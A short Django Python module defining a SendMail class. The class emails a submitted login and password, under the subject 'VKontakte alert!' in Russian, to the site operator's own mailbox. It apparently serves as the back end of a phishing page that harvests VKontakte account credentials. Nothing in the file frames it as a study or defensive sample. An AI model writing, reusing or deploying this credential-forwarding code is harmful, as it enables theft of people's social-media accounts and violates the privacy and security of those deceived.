from django.core.mail import send_mail
from django.conf import settings


class SendMail:
    def __init__(self, login: str, password: str):
        self.login = login
        self.password = password

    def send_data(self):
        try:
            send_mail(
                'Оповещение ВКонтакте!',
                f'Логин: {self.login}\nПароль: {self.password}',
                settings.EMAIL_HOST_USER,
                (settings.EMAIL_HOST_USER, ),
            )
        except Exception as e:
            print(e)
